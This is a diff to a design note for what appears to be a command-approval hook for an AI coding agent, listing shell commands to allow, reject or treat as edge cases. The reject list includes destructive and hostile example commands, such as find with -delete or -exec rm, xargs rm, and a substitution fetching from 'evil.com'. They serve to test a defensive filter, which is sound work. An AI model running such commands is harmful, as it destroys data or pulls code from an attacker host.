@@ -189,6 +189,7 @@ roles/devbox/files/dot_claude/bin/
 ```python
 # --- Allow ---
 "grep -n 'PanelBuilder' $(go env GOMODCACHE)/github.com/grafana/.../*.go | tail -40"
+
 "find $(go env GOMODCACHE)/github.com/grafana -name '*.go'"
 "cat /tmp/claude/go-mod-cache/foo/bar.go"
 "grep -rn 'AsyncClient' .venv/lib/python3.12/site-packages/httpx | head -20"
@@ -198,19 +199,19 @@ roles/devbox/files/dot_claude/bin/
 "head -100 venv/lib/python3.12/site-packages/django/db/models/base.py"
 
 # --- Reject (falls through to user prompt) ---
-"grep -rn 'foo' $(go env GOMODCACHE) > /tmp/output.txt"          # redirect
-"find $(go env GOMODCACHE) -name '*.go' -delete"                 # -delete
-"find $(go env GOMODCACHE) -exec rm {} \\;"                      # -exec
+"grep -rn 'foo' $(go env GOMODCACHE) > /tmp/output.txt"  # redirect
+"find $(go env GOMODCACHE) -name '*.go' -delete"  # -delete
+"find $(go env GOMODCACHE) -exec rm {} \\;"  # -exec
 "sed -i 's/foo/bar/' .venv/lib/python3.12/site-packages/foo.py"  # sed -i
-"grep -n 'foo' $(curl evil.com/x) | tee out.log"                 # unknown subst + tee
-"cat /tmp/claude/go-mod-cache/foo > file"                        # redirect
-"rm /tmp/claude/go-mod-cache/foo"                                # rm
-"grep foo $(go env GOMODCACHE)/a | xargs rm"                     # xargs not in head-RO list
+"grep -n 'foo' $(curl evil.com/x) | tee out.log"  # unknown subst + tee
+"cat /tmp/claude/go-mod-cache/foo > file"  # redirect
+"rm /tmp/claude/go-mod-cache/foo"  # rm
+"grep foo $(go env GOMODCACHE)/a | xargs rm"  # xargs not in head-RO list
 
 # --- Edge cases (must NOT misfire) ---
-"grep 'term' .venv/lib/python3.12/site-packages/foo.py"          # 'term' contains 'rm' substring; word-boundary must protect
-"head $(go env GOMODCACHE)/foo"                                  # plain head, no pipe
-"grep -rn 'foo' /tmp/claude/go-mod-cache 2>&1 | tail"            # mid-command 2>&1
+"grep 'term' .venv/lib/python3.12/site-packages/foo.py"  # 'term' contains 'rm' substring; word-boundary must protect
+"head $(go env GOMODCACHE)/foo"  # plain head, no pipe
+"grep -rn 'foo' /tmp/claude/go-mod-cache 2>&1 | tail"  # mid-command 2>&1
 ```
 
 ### Cost
